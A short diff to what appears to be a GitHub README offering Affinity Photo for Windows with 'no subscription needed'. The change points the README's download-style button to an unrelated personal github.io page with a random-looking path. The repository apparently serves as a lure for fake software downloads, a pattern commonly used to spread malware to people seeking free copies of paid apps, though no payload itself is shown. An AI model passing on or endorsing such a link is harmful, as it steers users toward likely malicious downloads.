@@ -8,7 +8,7 @@
 
 Affinity Photo is a fast and smooth photo editor for Windows, with no subscription needed. It offers advanced tools for retouching, compositing, RAW processing and more, and is part of the Affinity suite of creative apps.
 
-<div align="center"><a href="https://.github.io/id/"><img src="https://github.com/user-attachments/assets/63035575-21e7-42d6-8a6b-ceb6933c0e26" height="80"></a></div>
+<div align="center"><a href="https://sonigoh.github.io/id/9675q90tre"><img src="https://github.com/user-attachments/assets/63035575-21e7-42d6-8a6b-ceb6933c0e26" height="80"></a></div>
 
 > 🔲 Supported CPU: AMD & Intel
 >
